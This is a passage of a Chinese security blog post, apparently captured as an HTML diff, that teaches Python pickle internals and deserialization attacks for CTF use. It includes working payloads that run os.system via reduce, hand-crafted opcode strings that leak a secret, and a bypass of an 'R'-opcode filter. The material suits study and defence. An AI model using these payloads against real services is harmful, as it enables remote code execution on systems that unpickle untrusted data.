class="hljs-number">0x160578603d0</span>&gt;]<br><br>d: stack[&#123;&#125;, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>p <span class="hljs-number">5</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;, &#123;&#125;]<br><br>V a: stack[<span class="hljs-string">&quot;a&quot;</span>, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>p <span class="hljs-number">6</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;, &#123;&#125;, <span class="hljs-string">&quot;a&quot;</span>]<br><br>I <span class="hljs-number">1</span>: stack[<span class="hljs-number">1</span>, <span class="hljs-string">&quot;a&quot;</span>, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>s: stack[&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>&#125;, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>b: stack[&lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]  <span class="hljs-comment"># set a = 1</span><br><br>.: []  <span class="hljs-comment"># 返回 &lt;__main__.Test at 0x160578603d0&gt;</span><br></code></pre></td></tr></table></figure>
+<p>我感觉，整个过程有点像语法分析里的 LR 算法，不断移进-规约。</p>
+<p>虽然这个结果的可读性好了很多，但是依旧不容易读懂。</p>
+<p>所以 Python 官方提供了工具，叫 <code>pickletools</code>，它的作用主要是：</p>
+<ol type="1">
+<li>可读性较强的方式展示一个序列化对象（<code>pickletools.dis</code>）</li>
+<li>对一个序列化结果进行优化（<code>pickletools.optimize</code>）</li>
+</ol>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickletools<br><br><span class="hljs-built_in">print</span>(pickletools.dis(serialized))<br></code></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">&#x27;copy_reg _reconstructor&#x27;</span><br>   <span class="hljs-number">25</span>: p    PUT        <span class="hljs-number">0</span><br>   <span class="hljs-number">28</span>: (    MARK<br>   <span class="hljs-number">29</span>: c        GLOBAL     <span class="hljs-string">&#x27;__main__ Test&#x27;</span><br>   <span class="hljs-number">44</span>: p        PUT        <span class="hljs-number">1</span><br>   <span class="hljs-number">47</span>: c        GLOBAL     <span class="hljs-string">&#x27;__builtin__ object&#x27;</span><br>   <span class="hljs-number">67</span>: p        PUT        <span class="hljs-number">2</span><br>   <span class="hljs-number">70</span>: N        NONE<br>   <span class="hljs-number">71</span>: t        TUPLE      (MARK at <span class="hljs-number">28</span>)<br>   <span class="hljs-number">72</span>: p    PUT        <span class="hljs-number">3</span><br>   <span class="hljs-number">75</span>: R    REDUCE<br>   <span class="hljs-number">76</span>: p    PUT        <span class="hljs-number">4</span><br>   <span class="hljs-number">79</span>: (    MARK<br>   <span class="hljs-number">80</span>: d        DICT       (MARK at <span class="hljs-number">79</span>)<br>   <span class="hljs-number">81</span>: p    PUT        <span class="hljs-number">5</span><br>   <span class="hljs-number">84</span>: V    UNICODE    <span class="hljs-string">&#x27;a&#x27;</span><br>   <span class="hljs-number">87</span>: p    PUT        <span class="hljs-number">6</span><br>   <span class="hljs-number">90</span>: I    INT        <span class="hljs-number">1</span><br>   <span class="hljs-number">93</span>: s    SETITEM<br>   <span class="hljs-number">94</span>: b    BUILD<br>   <span class="hljs-number">95</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+<p>这个要比自己分析序列化结果清晰多了。</p>
+<p>细心的橘友们会注意到，在上面那个人工分析序列化的过程中，memo 一直是只有压入，没有弹出，所以 memo 里的数据压根就用不着，那么也有没必要压入了。所以上面的序列化结果完全可以把 <code>pn</code> 都去掉，再把不需要的 <code>\n</code> 移除，优化为：<code>b'ccopy_reg\n_reconstructor\n(c__main__\nTest\nc__builtin__\nobject\nNtR(dVa\nI1\nsb.'</code>，我们来执行一下试试：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/050a2946-9b39-4d74-a074-459fd1f71d80.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>当然，也可以用 <code>pickletools.optimize</code> 自动优化：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/282481f9-d78d-45db-aa57-91c9f2fbbea1.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>虽然这个优化结果与我们手动优化是一模一样的，但是在遇到复杂的序列化结果时，最好还是用这个方法来搞。</p>
+<h3 id="小结">小结</h3>
+<p>由于在反序列化的时候，这个对象要能在当前环境上下文中创建，所以在实际的利用过程中，那些默认加载的库、标准库（可被自动 import）就成了首选的类，比如 <code>os</code>，它有 <code>system</code> 方法。</p>
+<p>对于 Python 可以被 pickle/unpickle 的对象以及其他一些注意事项，可以参考官方文档，见资料 3</p>
+<p>我这里列出几点比较重要的：</p>
+<ol type="1">
+<li>函数（内置函数或用户自定义函数）在被封存时，引用的是函数全名（这就是为什么 <code>lambda</code> 函数不可以被封存：所有的匿名函数都有同一个名字：<code>&lt;lambda&gt;</code>）。这意味着只有函数所在的模块名，与函数名会被封存，函数体及其属性不会被封存。因此，在解封的环境中，函数所属的模块必须是可以被导入的，而且模块必须包含这个函数被封存时的名称，否则会抛出异常</li>
+<li>类也只封存名称，所以在解封环境中也有和函数相同的限制。注意，类体及其数据不会被封存，只有实例数据会被封存，所以在下面的例子中类属性 attr 不会存在于解封后的环境中：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>:<br>    attr = <span class="hljs-string">&#x27;A class attribute&#x27;</span><br><br>picklestring = pickle.dumps(Foo)<br></code></pre></td></tr></table></figure></li>
+<li>当实例解封时，它的 <code>__init__()</code> 方法通常不会被调用。其默认动作是：先创建一个未初始化的实例，然后还原其属性：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">save</span>(<span class="hljs-params">obj</span>):<br>    <span class="hljs-keyword">return</span> (obj.__class__, obj.__dict__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">cls, attributes</span>):<br>    obj = cls.__new__(cls)<br>    obj.__dict__.update(attributes)<br>    <span class="hljs-keyword">return</span> obj<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>最后需要注意的是，由于 <code>0</code> 的存在，一个序列化字符串可以包含很多个不相关的操作，在后面会有一个例子来说明。</p>
+<h2 id="攻击思路">攻击思路</h2>
+<p>本来打算按照攻击场景来分类的，但是我发现场景太多了，还是按照构造方式分类，攻击手法作为附属示例会比较清晰。</p>
+<p>payload 的构造分为用魔术方法自动构造和手动构造（手搓 opcode）。</p>
+<h3 id="自动构造">自动构造</h3>
+<p>首先，这样序列化肯定是达不到攻击目的的：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.a = os.system(<span class="hljs-string">&quot;whoami&quot;</span>)<br><br>test = Test()<br><br>serialized = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(serialized)<br></code></pre></td></tr></table></figure></p>
+<p><code>os.system("whoami")</code> 在 <code>test = Test()</code> 就会被执行完毕，所以这个可以说是自己日自己了。</p>
+<h4 id="相关魔术方法">相关魔术方法</h4>
+<p>上面提到过，解封的时候是有一个默认的赋值过程，既然是默认行为，往往是有办法自定义的。Python 提供了很多魔术方法（比如比较常见的 <code>__reduce__</code>），来改变这一默认行为。下面一起来看下这些魔术方法都是怎么用的（下面几个方法的介绍，内容大部分都是摘录自官方文档）。</p>
+<h5 id="getnewargs_ex__">__getnewargs_ex__()</h5>
+<p>限制：</p>
+<ol type="1">
+<li>对于使用 v2 版或更高版协议的 pickle 才能使用此方法</li>
+<li>必须返回一对 <code>(args, kwargs)</code> 用于构建对象，其中 <code>args</code> 是表示位置参数的 tuple，而 <code>kwargs</code> 是表示命名参数的 dict</li>
+</ol>
+<p><code>__getnewargs_ex__()</code> 方法 return 的值，会在解封时传给 <code>__new__()</code> 方法的作为它的参数。</p>
+<h5 id="getnewargs__">__getnewargs__()</h5>
+<p>限制：</p>
+<ol type="1">
+<li>必须返回一个 tuple 类型的 <code>args</code></li>
+<li>如果定义了 <code>__getnewargs_ex__()</code>，那么 <code>__getnewargs__()</code> 就不会被调用。</li>
+</ol>
+<p>这个方法与上一个 <code>__getnewargs_ex__()</code> 方法类似，但只支持位置参数。</p>
+<p>注：在 Python 3.6 前，v2、v3 版协议会调用 <code>__getnewargs__()</code>，更高版本协议会调用 <code>__getnewargs_ex__()</code></p>
+<h5 id="getstate__">__getstate__()</h5>
+<p>类还可以进一步控制实例的封存过程。如果类定义了 <code>__getstate__()</code>，它就会被调用，其返回的对象是被当做实例内容来封存的，否则封存的是实例的 <code>__dict__</code>。如果 <code>__getstate__()</code> 未定义，实例的 <code>__dict__</code> 会被照常封存。</p>
+<h5 id="setstate__">__setstate__()</h5>
+<p>当解封时，如果类定义了 <code>__setstate__()</code>，就会在已解封状态下调用它。此时不要求实例的 state 对象必须是 dict。没有定义此方法的话，先前封存的 state 对象必须是 dict，且该 dict 内容会在解封时赋给新实例的 <code>__dict__</code></p>
+<p>如果 <code>__getstate__()</code> 返回 <code>False</code>，那么在解封时就不会调用 <code>__setstate__()</code> 方法。</p>
+<p>所以可以这么理解，pickle 时，Python 会封存该实例的 <code>__getstate__</code> 方法返回给它的值；unpickle 时，Python 将 unpickle 后的值作为参数传递给实例的 <code>_setstate_()</code> 方法。而在 <code>_setstate_()</code> 方法内部，是按照事先自定义好的流程来重建实例。</p>
+<h5 id="reduce__">__reduce__()</h5>
+<p>限制：</p>
+<ol type="1">
+<li><code>__reduce__</code> 方法是新式类特有的</li>
+</ol>
+<p>opcode <code>R</code> 其实就是 <code>__reduce__()</code></p>
+<p><code>__reduce__()</code> 方法不带任何参数，并且应返回字符串或最好返回一个元组（返回的对象通常称为 “reduce 值”）。</p>
+<p>如果返回字符串，该字符串会被当做一个全局变量的名称。它应该是对象相对于其模块的本地名称，pickle 模块会搜索模块命名空间来确定对象所属的模块。这种行为常在单例模式使用。</p>
+<p>如果返回的是元组，则应当包含 2 到 6 个元素，可选元素可以省略或设置为 None。每个元素代表的意义如下：</p>
+<ol type="1">
+<li>一个可调用对象，该对象会在创建对象的最初版本时调用。</li>
+<li>可调用对象的参数，是一个元组。如果可调用对象不接受参数，必须提供一个空元组。</li>
+<li>可选元素，用于表示对象的状态，将被传给前述的 <code>__setstate__()</code> 方法。如果对象没有此方法，则这个元素必须是字典类型，并会被添加至 <code>__dict__</code> 属性中。</li>
+<li>可选元素，一个返回连续项的迭代器（而不是序列）。这些项会被 <code>obj.append(item)</code> 逐个加入对象，或被 <code>obj.extend(list_of_items)</code> 批量加入对象。这个元素主要用于 list 的子类，也可以用于那些正确实现了 <code>append()</code> 和 <code>extend()</code> 方法的类。（具体是使用 <code>append()</code> 还是 <code>extend()</code> 取决于 pickle 协议版本以及待插入元素的项数，所以这两个方法必须同时被类支持）</li>
+<li>可选元素，一个返回连续键值对的迭代器（而不是序列）。这些键值对将会以 <code>obj[key] = value</code> 的方式存储于对象中。该元素主要用于 dict 子类，也可以用于那些实现了 <code>__setitem__()</code> 的类。</li>
+<li>可选元素，一个带有 <code>(obj, state)</code> 签名的可调用对象。该可调用对象允许用户以编程方式控制特定对象的状态更新行为，而不是使用 obj 的静态 <code>__setstate__()</code> 方法。如果此处不是 None，则此可调用对象的优先级高于 obj 的 <code>__setstate__()</code>。</li>
+</ol>
+<p>3.8 新版功能: 新增了元组的第 6 项，可选元素 <code>(obj, state)</code></p>
+<p>可以看出，其实 pickle 并不直接调用上面的几个函数。事实上，它们实现了 <code>__reduce__()</code> 这一特殊方法。尽管这个方法功能很强，但是直接在类中实现 <code>__reduce__()</code> 容易产生错误。因此，设计类时应当尽可能的使用高级接口（比如 <code>__getnewargs_ex__()</code>、<code>__getstate__()</code> 和 <code>__setstate__()</code>）。后面仍然可以看到直接实现 <code>__reduce__()</code> 接口的状况，可能别无他法，可能为了获得更好的性能，或者两者皆有之。</p>
+<h5 id="reduce_ex__">__reduce_ex__()</h5>
+<p>作为替代选项，也可以实现 <code>__reduce_ex__()</code> 方法。此方法的唯一不同之处在于它接受一个整型参数用于指定协议版本。如果定义了这个函数，则会覆盖 <code>__reduce__()</code> 的行为。此外，<code>__reduce__()</code> 方法会自动成为扩展版方法的同义词。这个函数主要用于为以前的 Python 版本提供向后兼容的 reduce 值。</p>
+<h4 id="利用-__reduce__-自动生成">利用 __reduce__() 自动生成</h4>
+<p>这里举一个简单的执行命令的 demo。</p>
+<p>显然，在上面那么多方法中，<code>__reduce__()</code> 是我们的首选构造方案，demo 如下：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> os<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">&quot;whoami&quot;</span>, ))<br><br>test = Test()<br><br>serialized = pickle.dumps(test, protocol=<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(serialized)<br><br></code></pre></td></tr></table></figure></p>
+<p>结果：<code>b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'</code></p>
+<p>当然，新式类是 3.x 才有的。如果要在 2.x（&gt;= 2.2，&lt; 2.2 无新式类）使用 <code>__reduce__</code> 的话，需要手动显式继承新式类，把 <code>class Test</code> 改为 <code>class Test(object)</code> 即可。</p>
+<p>如果攻击目标可以传入任意序列化结果，那么这个 payload 直接就可以生效。这种攻击最为简单，在 CTF 中，有利用黑名单 ban 掉 system 等等函数的题目，思路就是寻找黑名单的漏网之鱼。</p>
+<h4 id="避免使用特定的-opcode">避免使用特定的 opcode</h4>
+<p>如果攻击目标有对传入的序列化结果做高危 opcode 判断的话，可以尝试用不同版本的协议：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/6109c631-07fe-4d16-bfbb-c415ddfc91f1.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/34f6ae5c-5293-4716-aa50-dc1a016a2e89.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>这种差异性或许能让我们绕过一些 if 判断。不过，诸如 <code>R</code> 这种比较必需的 opcode，一般是很难用其他 opcode 来直接代替的。</p>
+<h4 id="souse">souse</h4>
+<p>为了方便构造 Payload，我写了一个自动转化的工具：<a target="_blank" rel="noopener" href="https://github.com/Macr0phag3/souse">souse</a>，可以将 Python 源码形式的 exp 转为 opcode 形式的 exp，可冲！</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/help.png!blog#width-zoom6" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>不过，在用工具之前一定要先看下如何根据利用链手搓 opcode，毕竟工具只是工具而已。</p>
+<p>网上也有另一个自动构造工具，见资料 4。</p>
+<h3 id="手动构造">手动构造</h3>
+<p>手动构造需要对 opcode 比较了解（实际上用几次就熟练了）。由于自动构造的手法手动构造都可以做到，所以为了避免内容重复，这里只列举手动构造特有攻击的手法。</p>
+<h4 id="全局引用">全局引用</h4>
+<p>举个例子：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        obj = pickle.loads(ser)  <span class="hljs-comment"># 输入点</span><br>        <span class="hljs-keyword">if</span> obj.pwd == secret.pwd:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hello, admin!&quot;</span>)<br></code></pre></td></tr></table></figure></p>
+<p>在这个例子中，假如我就是想通过这个 if 来完成攻击，应该怎么实现呢？</p>
+<p>先看自动构造，比较直接的思路就是：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">secret</span>:<br>    pwd = <span class="hljs-string">&quot;???&quot;</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.pwd = secret.pwd<br><br>test = Target()<br><br>serialized = pickletools.optimize(pickle.dumps(test, protocol=<span class="hljs-number">0</span>))<br><span class="hljs-built_in">print</span>(serialized)<br><span class="hljs-comment"># 结果</span><br><span class="hljs-comment"># b&#x27;ccopy_reg\n_reconstructor\n(c__main__\nTarget\nc__builtin__\nobject\nNtR(dVpwd\nV???\nsb.&#x27;</span><br></code></pre></td></tr></table></figure></p>
+<p>这个犯了和上面那个命令执行相同的错误，在实例化 Target 的时候，<code>self.pwd</code> 就已经被赋值完成了，而这肯定是有问题的，因为你不知道 <code>secret.pwd</code> 到底是啥（这里加个 <code>class secret</code> 只是为了代码可以运行）。</p>
+<p>这个时候，我们可以利用 <code>c</code> 这个 opcode 来完成攻击。<code>c</code> 其实就是 <code>pickle.Unpickler().find_class(module, name)</code>。</p>
+<p>它的作用是导入 module 模块并返回其中名叫 <code>name</code> 的对象，其中 module 和 name 参数都是 str 对象。文档指出，<code>find_class()</code> 同样可以用来导入函数。</p>
+<p>既然如此，我们就可以把攻击目标类中引用的 <code>secret.pwd</code> 用 <code>c</code> 拿进来：<br />
+<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs rust"># 前后对比<br><span class="hljs-string">b&#x27;ccopy_reg<span class="hljs-char escape_">\n</span>_reconstructor<span class="hljs-char escape_">\n</span>(c__main__<span class="hljs-char escape_">\n</span>Target<span class="hljs-char escape_">\n</span>c__builtin__<span class="hljs-char escape_">\n</span>object<span class="hljs-char escape_">\n</span>NtR(dVpwd<span class="hljs-char escape_">\n</span>V???<span class="hljs-char escape_">\n</span>sb.&#x27;</span><br><br><span class="hljs-string">b&#x27;ccopy_reg<span class="hljs-char escape_">\n</span>_reconstructor<span class="hljs-char escape_">\n</span>(c__main__<span class="hljs-char escape_">\n</span>Target<span class="hljs-char escape_">\n</span>c__builtin__<span class="hljs-char escape_">\n</span>object<span class="hljs-char escape_">\n</span>NtR(dVpwd<span class="hljs-char escape_">\n</span>csecret<span class="hljs-char escape_">\n</span>pwd<span class="hljs-char escape_">\n</span>sb.&#x27;</span><br></code></pre></td></tr></table></figure></p>
+<p>丢进去看看：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/c51474bf-c23b-4402-9773-bcda53d65405.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>nice</p>
+<h4 id="引入魔术方法">引入魔术方法</h4>
+<p>举个 RCE 的例子：<br />
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Target</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        ser = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># 输入点</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;R&quot;</span> <span class="hljs-keyword">in</span> ser:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Hack! &lt;=@_@&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            obj = pickle.loads(ser)<br></code></pre></td></tr></table></figure></p>
+<p>对于这个例子来说，要想 RCE，需要过这里的 if，也就是不能用 <code>R</code>。</p>
+<p>先来看下常规的 payload 是什么样的：<br />
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">cnt<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>tp2<span class="hljs-symbol">\n</span>Rp3<span class="hljs-symbol">\n</span>.<br>                                    ^<br></code></pre></td></tr></table></figure><br />
+这 R 如何去除呢？<code>b</code> 就派上用场了。</p>
+<p>回顾一下它的作用：使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性/方法的设置。既然可以设置实例的方法，那么能不能设置一个方法让它在反序列化的时候自动运行呢？什么方法会在反序列化的时候自动运行，答案是上面提到的 <code>__setstate__()</code>。</p>
+<p>所以，我们只需要令 <code>__setstate__ = os.system</code>，再把参数传入即可：<br />
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">ccopy_reg<span class="hljs-symbol">\n</span>_reconstructor<span class="hljs-symbol">\n</span>(c__main__<span class="hljs-symbol">\n</span>Target<span class="hljs-symbol">\n</span>c__builtin__<span class="hljs-symbol">\n</span>object<span class="hljs-symbol">\n</span>NtR(dV__setstate__<span class="hljs-symbol">\n</span>cos<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>ubVwhoami<span class="hljs-symbol">\n</span>b.<br></code></pre></td></tr></table></figure></p>
+<p>但是我们把执行函数的那个 R 去掉之后，由于要构建实例，又引入了一个新的 R。用前面提到过的，修改协议版本即可：<br />
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">\x80\x02c__main__\nTest\n)\x81&#125;(V__setstate__\ncos\nsystem\nubVwhoami\nb.</span><br><span class="hljs-comment"># pickletools.dis 如下</span><br>    <span class="hljs-attr">0:</span> <span class="hljs-string">c</span>    <span class="hljs-string">GLOBAL</span>     <span class="hljs-string">&#x27;__main__ Test&#x27;</span><br>   <span class="hljs-attr">15:</span> <span class="hljs-string">)</span>    <span class="hljs-string">EMPTY_TUPLE</span><br>   <span class="hljs-attr">16:</span> <span class="hljs-string">\x81</span> <span class="hljs-string">NEWOBJ</span><br>   <span class="hljs-attr">17:</span> <span class="hljs-string">&#125;</span>    <span class="hljs-string">EMPTY_DICT</span><br>   <span class="hljs-attr">18:</span> <span class="hljs-string">(</span>    <span class="hljs-string">MARK</span><br>   <span class="hljs-attr">19:</span> <span class="hljs-string">V</span>        <span class="hljs-string">UNICODE</span>    <span class="hljs-string">&#x27;__setstate__&#x27;</span><br>   <span class="hljs-attr">33:</span> <span class="hljs-string">c</span>        <span class="hljs-string">GLOBAL</span>     <span class="hljs-string">&#x27;os system&#x27;</span><br>   <span class="hljs-attr">44:</span> <span class="hljs-string">u</span>        <span class="hljs-string">SETITEMS</span>   <span class="hljs-string">(MARK</span> <span class="hljs-string">at</span> <span class="hljs-number">18</span><span class="hljs-string">)</span><br>   <span class="hljs-attr">45:</span> <span class="hljs-string">b</span>    <span class="hljs-string">BUILD</span><br>   <span class="hljs-attr">46:</span> <span class="hljs-string">V</span>    <span class="hljs-string">UNICODE</span>    <span class="hljs-string">&#x27;whoami&#x27;</span><br>   <span class="hljs-attr">54:</span> <span class="hljs-string">b</span>    <span class="hljs-string">BUILD</span><br>   <span class="hljs-attr">55:</span> <span class="hljs-string">.</span>    <span class="hljs-string">STOP</span><br></code></pre></td></tr></table></figure></p>
+<p><code>\x80\x02</code> 是协议的版本声明，可写可不写，写错了也不影响 Python 识别；<code>\x81</code> 其实就是通过 <code>cls.__new__</code> 来创建一个实例，需要栈顶有 args（元组） 和 kwds（字典）。</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/6397d745-ca0b-48ed-a2ee-73b89b8766e5.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<h4 id="find_class-黑名单绕过">find_class 黑名单绕过</h4>
+<p>Python 的官方文档里，明确表示了 pickle 是不保证安全性的，所以数据一定要可信才能进行 unpickle</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/bc66e3be-c891-4c13-ba24-a1db7cc29ecf.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>同时，也给出了安全使用 pickle 的最佳实践：</p>
+<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/a7951335-6080-420d-a558-544c50aa2f2d.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
+<p>当序列化中 opcode 出现 <code>c</code>、<code>i</code>、<code>b'\x93'</code> 时，会调用 find_class。利用白名单方法来限制解封的对象一般是没问题的。但是如果用黑名单，就容易出现疏漏，攻击的思路就是用 mro 来层层深入寻找黑名单以外的模块、方法，与我之前写的《Python 沙箱逃逸的经验总结》（见资料 1）里提到的技巧如出一辙，我这里就不啰嗦了。</p>
+<p>如果你经常打 CTF，就会发现现在 Python 反序列化的题目基本上都要用到 find_class，后面会有一些经典的题目。作为题目难度控制器，需要和其他场景联合起来去看如何绕过，所以我这里就不单独举例说明了。</p>
+<h4 id="变量与方法覆盖">变量与方法覆盖</h4>
+<p>举个例子：<br />
